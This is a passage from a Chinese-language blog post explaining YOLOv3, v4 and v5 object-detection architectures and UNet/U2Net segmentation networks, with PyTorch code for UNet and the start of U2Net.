,res8等等，表示这个res_block里含有多少个res_unit。不懂resnet请戳这儿</p><p>concat：张量拼接；将darknet中间层和后面的某一层的上采样进行拼接。拼接的操作和残差层add的操作是不一样的，拼接会扩充张量的维度，而add只是直接相加不会导致张量维度的改变。</p><p><strong>Backbone：darknet-53</strong></p><p>为了达到更好的分类效果，作者自己设计训练了darknet-53，在ImageNet数据集上实验发现这个darknet-53，的确很强，相对于ResNet-152和ResNet-101，darknet-53不仅在分类精度上差不多，计算速度还比ResNet-152和ResNet-101强多了，网络层数也比他们少。</p><p>YOLOv3使用了darknet-53的前面的52层（没有全连接层），YOLOv3这个网络是一个全卷积网络，大量使用残差的跳层连接，并且为了降低池化带来的梯度负面效果，作者直接摒弃了POOLing，用conv的stride来实现降采样。在这个网络结构中，使用的是步长为2的卷积来进行降采样。</p><p>为了加强算法对小目标检测的精确度，YOLOv3中采用类似FPN的upsample和融合做法（最后融合了3个scale，其他两个scale的大小分别是26×26和52×52），在多个scale的feature map上做检测。</p><p>作者在3条预测支路采用的也是全卷积的结构，其中最后一个卷积层的卷积核个数是255，是针对COCO数据集的80类：3*(80+4+1)&#x3D;255，3表示一个grid cell包含3个bounding box，4表示框的4个坐标信息，1表示objectness score。</p><p>网络中作者进行了三次检测，分别是在32倍降采样，16倍降采样，8倍降采样时进行检测，这样在多尺度的feature map上检测跟SSD有点像。在网络中使用up-sample（上采样）的原因:网络越深的特征表达效果越好，比如在进行16倍降采样检测，如果直接使用第四次下采样的特征来检测，这样就使用了浅层特征，这样效果一般并不好。如果想使用32倍降采样后的特征，但深层特征的大小太小，因此YOLOv3使用了步长为2的up-sample（上采样），把32倍降采样得到的feature map的大小提升一倍，也就成了16倍降采样后的维度。同理8倍采样也是对16倍降采样的特征进行步长为2的上采样，这样就可以使用深层特征进行detection。</p><p>作者通过上采样将深层特征提取，其维度是与将要融合的特征层维度相同的（channel不同）。如下图所示，85层将13×13×256的特征上采样得到26×26×256，再将其与61层的特征拼接起来得到26×26×768。为了得到channel255，还需要进行一系列的3×3，1×1卷积操作，这样既可以提高非线性程度增加泛化性能提高网络精度，又能减少参数提高实时性。52×52×255的特征也是类似的过程。</p><p><strong>Bounding Box</strong></p><p>YOLOv3的Bounding Box由YOLOv2又做出了更好的改进。在YOLOv2和YOLOv3中，都采用了对图像中的object采用k-means聚类。feature map中的每一个cell都会预测3个边界框（bounding box） ，每个bounding box都会预测三个东西：（1）每个框的位置（4个值，中心坐标tx和ty，框的高度bh和宽度bw），（2）一个objectness prediction ，（3）N个类别，coco数据集80类，voc20类。</p><p>三次检测，每次对应的感受野不同，32倍降采样的感受野最大，适合检测大的目标，所以在输入为416×416时，每个cell的三个anchor box为(116 ,90); (156 ,198); (373 ,326)。16倍适合一般大小的物体，anchor box为(30,61); (62,45); (59,119)。8倍的感受野最小，适合检测小目标，因此anchor box为(10,13); (16,30); (33,23)。所以当输入为416×416时，实际总共有（52×52+26×26+13×13）×3&#x3D;10647个proposal box。</p><p><strong>LOSS Function</strong></p><p>YOLOv3重要改变之一：No more softmaxing the classes。YOLOv3现在对图像中检测到的对象执行多标签分类。</p><p>logistic回归用于对anchor包围的部分进行一个目标性评分(objectness score)，即这块位置是目标的可能性有多大。这一步是在predict之前进行的，可以去掉不必要anchor，可以减少计算量。</p><p>如果模板框不是最佳的即使它超过我们设定的阈值，我们还是不会对它进行predict。不同于Faster R-CNN的是，YOLOv3只会对1个prior进行操作，也就是那个最佳prior。而logistic回归就是用来从9个anchor priors中找到objectness score(目标存在可能性得分)最高的那一个。logistic回归就是用曲线对prior相对于 objectness score映射关系的线性建模。</p><ul><li>首先，YOLOv3要先build target，因为我们知道正样本是label与anchor box iou大于0.5的组成，所以我们根据label找到对应的anchor box。如何找出label中存放着[image,class,x(归一化),y,w(归一化),h],我们可以用这些坐标在对应13×13 Or 26×26 or 52×52的map中分别于9个anchor算出iou，找到符合要求的，把索引与位置记录好。用记录好的索引位置找到predict的anchor box。</li><li>xywh是由均方差来计算loss的，其中预测的xy进行sigmoid来与lable xy求差，label xy是grid cell中心点坐标，其值在0-1之间，所以predict出的xy要sigmoid。</li><li>分类用的多类别交叉熵，置信度用的二分类交叉熵。只有正样本才参与class，xywh的loss计算，负样本只参与置信度loss。</li></ul><h4 id="YOLO-v4"><a href="#YOLO-v4" class="headerlink" title="YOLO v4"></a>YOLO v4</h4><p>YOLOv4: Optimal Speed and Accuracy of Object Detection</p><p>论文：<a href="https://arxiv.org/abs/2004.10934">https://arxiv.org/abs/2004.10934</a></p><p>代码：<a href="https://github.com/AlexeyAB/darknet">https://github.com/AlexeyAB/darknet</a></p><p>YOLOv4其实是一个结合了大量前人研究技术，加以组合并进行适当创新的算法，实现了速度和精度的完美平衡。可以说有许多技巧可以提高卷积神经网络(CNN)的准确性，但是某些技巧仅适合在某些模型上运行，或者仅在某些问题上运行，或者仅在小型数据集上运行；我们来码一码这篇文章里作者都用了哪些调优手段：加权残差连接(WRC),跨阶段部分连接(CSP),跨小批量标准化(CmBN),自对抗训练(SAT),Mish激活,马赛克数据增强,CmBN,DropBlock正则化,CIoU Loss等等。经过一系列的堆料，终于实现了目前最优的实验结果：43.5％的AP(在Tesla V100上，MS COCO数据集的实时速度约为65FPS)。</p><p>先直接上<code>YOLOv4</code>的整体原理图(来源网络)如下：</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2022-12-04_19-17-31-20221204%2022:01:36.png" alt="Snipaste_2022-12-04_19-17-31"></p><p>我们前面知道在YOLOv3中，特征提取网络使用的是Darknet53，而在YOLOv4中，对Darknet53做了一点改进，借鉴了CSPNet，CSPNet全称是Cross Stage Partial Networks，也就是跨阶段局部网络。CSPNet解决了其他大型卷积神经网络框架Backbone中网络优化的梯度信息重复问题，将梯度的变化从头到尾地集成到特征图中，因此减少了模型的参数量和FLOPS数值，既保证了推理速度和准确率，又减小了模型尺寸。<br>CSPNet实际上是基于Densnet的思想，复制基础层的特征映射图，通过dense block发送副本到下一个阶段，从而将基础层的特征映射图分离出来。这样可以有效缓解梯度消失问题(通过非常深的网络很难去反推丢失信号) ，支持特征传播，鼓励网络重用特征，从而减少网络参数数量。CSPNet思想可以和ResNet、ResNeXt和DenseNet结合，目前主要有CSPResNext50 和CSPDarknet53两种改造Backbone网络。</p><p>考虑到几方面的平衡：输入网络分辨率&#x2F;卷积层数量&#x2F;参数数量&#x2F;输出维度。一个模型的分类效果好不见得其检测效果就好，想要检测效果好需要以下几点：</p><ul><li>更大的网络输入分辨率——用于检测小目标</li><li>更深的网络层——能够覆盖更大面积的感受野</li><li>更多的参数——更好的检测同一图像内不同size的目标</li></ul><p>为了增大感受野，作者还使用了<code>SPP-block</code>，使用<code>PANet</code>代替<code>FPN</code>进行参数聚合以适用于不同<code>level</code>的目标检测。</p><p><code>SPP-Net</code>全称<code>Spatial Pyramid Pooling Networks</code>，当时主要是用来解决不同尺寸的特征图如何进入全连接层的，直接看下图，下图中对任意尺寸的特征图直接进行固定尺寸的池化，来得到固定数量的特征。</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2022-12-04_19-20-50-20221204%2022:01:46.png" alt="Snipaste_2022-12-04_19-20-50"></p><p>如上图，以3个尺寸的池化为例，对特征图进行一个最大值池化，即一张特征图得取其最大值，得到1<em>d(d是特征图的维度)个特征；对特征图进行网格划分为2x2的网格，然后对每个网格进行最大值池化，那么得到4</em>d个特征；同样，对特征图进行网格划分为4x4个网格，对每个网格进行最大值池化，得到16*d个特征。 接着将每个池化得到的特征合起来即得到固定长度的特征个数（特征图的维度是固定的），接着就可以输入到全连接层中进行训练网络了。用到这里是为了增加感受野。</p><p><code>YOLOv4</code>使用<code>PANet</code>(<code>Path Aggregation Network</code>)代替<code>FPN</code>进行参数聚合以适用于不同<code>level</code>的目标检测, <code>PANet</code>论文中融合的时候使用的方法是<code>Addition</code>，<code>YOLOv4</code>算法将融合的方法由加法改为<code>Concatenation</code>。</p><p><strong>激活函数</strong></p><p>对激活函数的研究一直没有停止过，<code>ReLU</code>还是统治着深度学习的激活函数，不过，这种情况有可能会被<code>Mish</code>改变。<code>Mish</code>是另一个与<code>ReLU</code>和<code>Swish</code>非常相似的激活函数。正如论文所宣称的那样，<code>Mish</code>可以在不同数据集的许多深度网络中胜过它们。公式为：$y &#x3D; x*tanh(ln(1+e^x))$</p><p>Mish是一个平滑的曲线，平滑的激活函数允许更好的信息深入神经网络，从而得到更好的准确性和泛化；在负值的时候并不是完全截断，允许比较小的负梯度流入。实验中，随着层深的增加，ReLU激活函数精度迅速下降，而Mish激活函数在训练稳定性、平均准确率(1%-2.8%)、峰值准确率(1.2% - 3.6%)等方面都有全面的提高。如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2022-12-04_19-28-33-20221204%2022:01:57.png" alt="Snipaste_2022-12-04_19-28-33"></p><p><strong>自对抗训练(SAT)</strong></p><p>SAT为一种新型数据增强方式。在第一阶段，神经网络改变原始图像而不是网络权值。通过这种方式，神经网络对其自身进行一种对抗式的攻击，改变原始图像，制造图像上没有目标的假象。在第二阶段，训练神经网络对修改后的图像进行正常的目标检测。</p><p>Self-Adversarial Training是在一定程度上抵抗对抗攻击的数据增强技术。CNN计算出Loss, 然后通过反向传播改变图片信息，形成图片上没有目标的假象，然后对修改后的图像进行正常的目标检测。需要注意的是在SAT的反向传播的过程中，是不需要改变网络权值的。 使用对抗生成可以改善学习的决策边界中的薄弱环节，提高模型的鲁棒性。因此这种数据增强方式被越来越多的对象检测框架运用。</p><p>YOLO v5</p><p>YOLOv4出现之后不久，YOLOv5横空出世。YOLOv5在YOLOv4算法的基础上做了进一步的改进，检测性能得到进一步的提升。虽然YOLOv5算法并没有与YOLOv4算法进行性能比较与分析，但是YOLOv5在COCO数据集上面的测试效果还是挺不错的。大家对YOLOv5算法的创新性半信半疑，有的人对其持肯定态度，有的人对其持否定态度。在我看来，YOLOv5检测算法中还是存在很多可以学习的地方，虽然这些改进思路看来比较简单或者创新点不足，但是它们确定可以提升检测算法的性能。其实工业界往往更喜欢使用这些方法，而不是利用一个超级复杂的算法来获得较高的检测精度。<br>YOLOv5是一种单阶段目标检测算法，该算法在YOLOv4的基础上添加了一些新的改进思路，使其速度与精度都得到了极大的性能提升。主要的改进思路如下所示：</p><p>输入端：在模型训练阶段，提出了一些改进思路，主要包括Mosaic数据增强、自适应锚框计算、自适应图片缩放；</p><p>基准网络：融合其它检测算法中的一些新思路，主要包括：Focus结构与CSP结构；</p><p>Neck网络：目标检测网络在BackBone与最后的Head输出层之间往往会插入一些层，Yolov5中添加了FPN+PAN结构；</p><p>Head输出层：输出层的锚框机制与YOLOv4相同，主要改进的是训练时的损失函数GIOU_Loss，以及预测框筛选的DIOU_nms。</p><p>网络架构</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2022-12-04_19-30-57-20221204%2022:02:07.png" alt="Snipaste_2022-12-04_19-30-57"></p><p>上图展示了YOLOv5目标检测算法的整体框图。对于一个目标检测算法而言，我们通常可以将其划分为4个通用的模块，具体包括：输入端、基准网络、Neck网络与Head输出端，对应于上图中的4个红色模块。YOLOv5算法具有4个版本，具体包括：YOLOv5s、YOLOv5m、YOLOv5l、YOLOv5x四种，本文重点讲解YOLOv5s，其它的版本都在该版本的基础上对网络进行加深与加宽。</p><ul><li>输入端-输入端表示输入的图片。该网络的输入图像大小为608*608，该阶段通常包含一个图像预处理阶段，即将输入图像缩放到网络的输入大小，并进行归一化等操作。在网络训练阶段，YOLOv5使用Mosaic数据增强操作提升模型的训练速度和网络的精度；并提出了一种自适应锚框计算与自适应图片缩放方法。</li><li>基准网络-基准网络通常是一些性能优异的分类器种的网络，该模块用来提取一些通用的特征表示。YOLOv5中不仅使用了CSPDarknet53结构，而且使用了Focus结构作为基准网络。</li><li>Neck网络-Neck网络通常位于基准网络和头网络的中间位置，利用它可以进一步提升特征的多样性及鲁棒性。虽然YOLOv5同样用到了SPP模块、FPN+PAN模块，但是实现的细节有些不同。</li><li>Head输出端-Head用来完成目标检测结果的输出。针对不同的检测算法，输出端的分支个数不尽相同，通常包含一个分类分支和一个回归分支。YOLOv4利用GIOU_Loss来代替Smooth L1 Loss函数，从而进一步提升算法的检测精度。</li></ul><p>YOLO v5基础组件</p><ul><li>CBL-CBL模块由Conv+BN+Leaky_relu激活函数组成，如上图中的模块1所示。</li><li>Res unit-借鉴ResNet网络中的残差结构，用来构建深层网络，CBM是残差模块中的子模块，如上图中的模块2所示。</li><li>CSP1_X-借鉴CSPNet网络结构，该模块由CBL模块、Res unint模块以及卷积层、Concate组成而成，如上图中的模块3所示。</li><li>CSP2_X-借鉴CSPNet网络结构，该模块由卷积层和X个Res unint模块Concate组成而成，如上图中的模块4所示。</li><li>Focus-如上图中的模块5所示，Focus结构首先将多个slice结果Concat起来，然后将其送入CBL模块中。</li><li>SPP-采用1×1、5×5、9×9和13×13的最大池化方式，进行多尺度特征融合，如上图中的模块6所示。</li></ul><blockquote><p>yolo系列参考 [这里][<a href="https://blog.csdn.net/qq_40716944/article/details/114822515?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2-114822515-blog-105157452.pc_relevant_3mothn_strategy_and_data_recovery&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2-114822515-blog-105157452.pc_relevant_3mothn_strategy_and_data_recovery&amp;utm_relevant_index=5%5D">https://blog.csdn.net/qq_40716944/article/details/114822515?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2-114822515-blog-105157452.pc_relevant_3mothn_strategy_and_data_recovery&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2-114822515-blog-105157452.pc_relevant_3mothn_strategy_and_data_recovery&amp;utm_relevant_index=5]</a></p></blockquote><h3 id="5-图像分割-x2F-语义分割"><a href="#5-图像分割-x2F-语义分割" class="headerlink" title="5. 图像分割&#x2F;语义分割"></a>5. 图像分割&#x2F;语义分割</h3><h4 id="unet"><a href="#unet" class="headerlink" title="unet"></a>unet</h4><p>Unet可以说是<strong>最常用、最简单</strong>的一种分割模型了，它简单、高效、易懂、容易构建、可以从小数据集中训练。</p><p>Unet已经是非常老的分割模型了，是2015年《U-Net: Convolutional Networks for Biomedical Image Segmentation》提出的模型，论文链接：<a href="https://arxiv.org/abs/1505.04597">https://arxiv.org/abs/1505.04597</a></p><p>在Unet之前，则是更老的FCN网络，FCN是Fully Convolutional Netowkrs的碎屑，不过这个<strong>基本上是一个框架，到现在的分割网络，谁敢说用不到卷积层呢。</strong> 不过FCN网络的准确度较低，不比Unet好用。现在还有Segnet，Mask RCNN，DeepLabv3+等网络，不过今天我先介绍Unet，毕竟一口吃不成胖子。</p><p>网络结构</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2022-12-04_19-35-40-20221204%2022:02:18.png" alt="Snipaste_2022-12-04_19-35-40"></p><p>这个结构就是先对图片进行卷积和池化，在Unet论文中是池化4次，比方说一开始的图片是224x224的，那么就会变成112x112，56x56,28x28,14x14四个不同尺寸的特征。<strong>然后我们对14x14的特征图做上采样或者反卷积，得到28x28的特征图，这个28x28的特征图与之前的28x28的特征图进行通道伤的拼接concat，然后再对拼接之后的特征图做卷积和上采样，得到56x56的特征图，再与之前的56x56的特征拼接，卷积，再上采样，经过四次上采样可以得到一个与输入图像尺寸相同的224x224的预测结果。</strong></p><p>其实整体来看，这个也是一个Encoder-Decoder的结构。</p><p>Unet网络非常的简单，前半部分就是特征提取，后半部分是上采样。在一些文献中把这种结构叫做<strong>编码器-解码器结构</strong>，由于网络的整体结构是一个大些的英文字母U，所以叫做U-net。</p><ul><li>Encoder：左半部分，由两个3x3的卷积层（RELU）再加上一个2x2的maxpooling层组成一个下采样的模块（后面代码可以看出）；</li><li>Decoder：有半部分，由一个上采样的卷积层（去卷积层）+特征拼接concat+两个3x3的卷积层（ReLU）反复构成（代码中可以看出来）；</li></ul><p>Unet的好处我感觉是：网络层越深得到的特征图，有着更大的视野域，浅层卷积关注纹理特征，深层网络关注本质的那种特征，所以深层浅层特征都是有格子的意义的；另外一点是通过反卷积得到的更大的尺寸的特征图的边缘，是缺少信息的，毕竟每一次下采样提炼特征的同时，也必然会损失一些边缘特征，而失去的特征并不能从上采样中找回，因此通过特征的拼接，来实现边缘特征的一个找回。</p><p>注：大多数医疗影像语义分割任务都会首先用Unet作为baseline</p><p>附一个比较清晰的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn<br><span class="hljs-keyword">import</span> torch.nn.functional <span class="hljs-keyword">as</span> F<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">double_conv2d_bn</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,in_channels,out_channels,kernel_size=<span class="hljs-number">3</span>,strides=<span class="hljs-number">1</span>,padding=<span class="hljs-number">1</span></span>):<br>        <span class="hljs-built_in">super</span>(double_conv2d_bn,self).__init__()<br>        self.conv1 = nn.Conv2d(in_channels,out_channels,<br>                               kernel_size=kernel_size,<br>                              stride = strides,padding=padding,bias=<span class="hljs-literal">True</span>)<br>        self.conv2 = nn.Conv2d(out_channels,out_channels,<br>                              kernel_size = kernel_size,<br>                              stride = strides,padding=padding,bias=<span class="hljs-literal">True</span>)<br>        self.bn1 = nn.BatchNorm2d(out_channels)<br>        self.bn2 = nn.BatchNorm2d(out_channels)<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self,x</span>):<br>        out = F.relu(self.bn1(self.conv1(x)))<br>        out = F.relu(self.bn2(self.conv2(out)))<br>        <span class="hljs-keyword">return</span> out<br>    <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">deconv2d_bn</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,in_channels,out_channels,kernel_size=<span class="hljs-number">2</span>,strides=<span class="hljs-number">2</span></span>):<br>        <span class="hljs-built_in">super</span>(deconv2d_bn,self).__init__()<br>        self.conv1 = nn.ConvTranspose2d(in_channels,out_channels,<br>                                        kernel_size = kernel_size,<br>                                       stride = strides,bias=<span class="hljs-literal">True</span>)<br>        self.bn1 = nn.BatchNorm2d(out_channels)<br>        <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self,x</span>):<br>        out = F.relu(self.bn1(self.conv1(x)))<br>        <span class="hljs-keyword">return</span> out<br>    <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Unet</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>(Unet,self).__init__()<br>        self.layer1_conv = double_conv2d_bn(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>)<br>        self.layer2_conv = double_conv2d_bn(<span class="hljs-number">8</span>,<span class="hljs-number">16</span>)<br>        self.layer3_conv = double_conv2d_bn(<span class="hljs-number">16</span>,<span class="hljs-number">32</span>)<br>        self.layer4_conv = double_conv2d_bn(<span class="hljs-number">32</span>,<span class="hljs-number">64</span>)<br>        self.layer5_conv = double_conv2d_bn(<span class="hljs-number">64</span>,<span class="hljs-number">128</span>)<br>        self.layer6_conv = double_conv2d_bn(<span class="hljs-number">128</span>,<span class="hljs-number">64</span>)<br>        self.layer7_conv = double_conv2d_bn(<span class="hljs-number">64</span>,<span class="hljs-number">32</span>)<br>        self.layer8_conv = double_conv2d_bn(<span class="hljs-number">32</span>,<span class="hljs-number">16</span>)<br>        self.layer9_conv = double_conv2d_bn(<span class="hljs-number">16</span>,<span class="hljs-number">8</span>)<br>        self.layer10_conv = nn.Conv2d(<span class="hljs-number">8</span>,<span class="hljs-number">1</span>,kernel_size=<span class="hljs-number">3</span>,<br>                                     stride=<span class="hljs-number">1</span>,padding=<span class="hljs-number">1</span>,bias=<span class="hljs-literal">True</span>)<br>        <br>        self.deconv1 = deconv2d_bn(<span class="hljs-number">128</span>,<span class="hljs-number">64</span>)<br>        self.deconv2 = deconv2d_bn(<span class="hljs-number">64</span>,<span class="hljs-number">32</span>)<br>        self.deconv3 = deconv2d_bn(<span class="hljs-number">32</span>,<span class="hljs-number">16</span>)<br>        self.deconv4 = deconv2d_bn(<span class="hljs-number">16</span>,<span class="hljs-number">8</span>)<br>        <br>        self.sigmoid = nn.Sigmoid()<br>        <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self,x</span>):<br>        conv1 = self.layer1_conv(x)<br>        pool1 = F.max_pool2d(conv1,<span class="hljs-number">2</span>)<br>        <br>        conv2 = self.layer2_conv(pool1)<br>        pool2 = F.max_pool2d(conv2,<span class="hljs-number">2</span>)<br>        <br>        conv3 = self.layer3_conv(pool2)<br>        pool3 = F.max_pool2d(conv3,<span class="hljs-number">2</span>)<br>        <br>        conv4 = self.layer4_conv(pool3)<br>        pool4 = F.max_pool2d(conv4,<span class="hljs-number">2</span>)<br>        <br>        conv5 = self.layer5_conv(pool4)<br>        <br>        convt1 = self.deconv1(conv5)<br>        concat1 = torch.cat([convt1,conv4],dim=<span class="hljs-number">1</span>)<br>        conv6 = self.layer6_conv(concat1)<br>        <br>        convt2 = self.deconv2(conv6)<br>        concat2 = torch.cat([convt2,conv3],dim=<span class="hljs-number">1</span>)<br>        conv7 = self.layer7_conv(concat2)<br>        <br>        convt3 = self.deconv3(conv7)<br>        concat3 = torch.cat([convt3,conv2],dim=<span class="hljs-number">1</span>)<br>        conv8 = self.layer8_conv(concat3)<br>        <br>        convt4 = self.deconv4(conv8)<br>        concat4 = torch.cat([convt4,conv1],dim=<span class="hljs-number">1</span>)<br>        conv9 = self.layer9_conv(concat4)<br>        outp = self.layer10_conv(conv9)<br>        outp = self.sigmoid(outp)<br>        <span class="hljs-keyword">return</span> outp<br>    <br><br>model = Unet()<br>inp = torch.rand(<span class="hljs-number">10</span>,<span class="hljs-number">1</span>,<span class="hljs-number">224</span>,<span class="hljs-number">224</span>)<br>outp = model(inp)<br><span class="hljs-built_in">print</span>(outp.shape)<br>==&gt; torch.Size([<span class="hljs-number">10</span>, <span class="hljs-number">1</span>, <span class="hljs-number">224</span>, <span class="hljs-number">224</span>])<br></code></pre></td></tr></table></figure><h4 id="u2net"><a href="#u2net" class="headerlink" title="u2net"></a>u2net</h4><p>论文：<a href="https://arxiv.org/pdf/2005.09007.pdf">https://arxiv.org/pdf/2005.09007.pdf</a></p><p>代码：<a href="https://codeload.github.com/NathanUA/U-2-Net/zip/master">https://codeload.github.com/NathanUA/U-2-Net/zip/master</a></p><p>U2net是基于unet提出的一种新的网络结构，同样基于encode-decode，作者参考FPN，Unet，在此基础之上提出了一种新模块RSU(ReSidual U-blocks) 经过测试，对于分割物体前背景取得了惊人的效果。同样具有较好的实时性，经过测试在P100上前向时间仅为18ms(56fps)。</p><p>网络结构</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2022-12-04_20-15-07-20221204%2022:02:32.png" alt="Snipaste_2022-12-04_20-15-07"></p><p>其实这个网络结构以及把一整个u2net完整的表示出来了，作者提出了一种名为RSU的新模块。对于每个RSU本身就是一个小号的Unet，最后所有的RSU用一种类似FPN的结构连接在一起。类似down-top top-down。通过这种方式来增加多尺度能力。获得了极为优秀的分割结果。</p><p>从这个结构可以很容易的看出，所谓的RSU其实就是一个很简单的Unet</p><p>作者通过类似FPN的结构，将多个Unet输出结果进行组合。最后进行合并，得到mask，通过多个loss在不同层的表现来进行更新。取得了非常理想的效果。</p><p>下面是整个U2net代码细节的介绍：</p><p>由于这个代码写的相对比较。。嗯。写的比较清晰，所以和以往的介绍不一样，我以代码注释的形式介绍好了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">U2NET</span>(nn.Module):<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,in_ch=<span class="hljs-number">3</span>,out_ch=<span class="hljs-number">1</span></span>):<br>        <span class="hljs-built_in">super</span>(U2NET,self).__init__()<br>        self.stage1 = RSU7(in_ch,<span class="hljs-number">32</span>,<span class="hljs-number">64</span>)<br><span class="hljs-comment">#对于每一个RSU来说，本质其实就是一个Unet，多个下采样多个上采样</span><br><br>        self.pool12 = nn.MaxPool2d(<span class="hljs-number">2</span>,stride=<span class="hljs-number">2</span>,ceil_mode=<span class="hljs-literal">True</span>)<br>        self.stage2 = RSU6(<span class="hljs-number">64</span>,<span class="hljs-number">32</span>,<span class="hljs-number">128</span>)<br>        self.pool23 = nn.MaxPool2d(<span class="hljs-number">2</span>,stride=<span class="hljs-number">2</span>,ceil_mode=<span class="hljs-literal">True</span>)<br>        self.stage3 = RSU5(<span class="hljs-number">128</span>,<span class="hljs-number">64</span>,<span class="hljs-number">256</span>)<br>        self.pool34 = nn.MaxPool2d(<span class="hljs-number">2</span>,stride=<span class="hljs-number">2</span>,ceil_mode=<span class="hljs-literal">True</span>)<br>        self.stage4 = RSU4(<span class="hljs-number">256</span>,<span class="hljs-number">128</span>,<span class="hljs-number">512</span>)<br>        self.pool45 = nn.MaxPool2d(<span 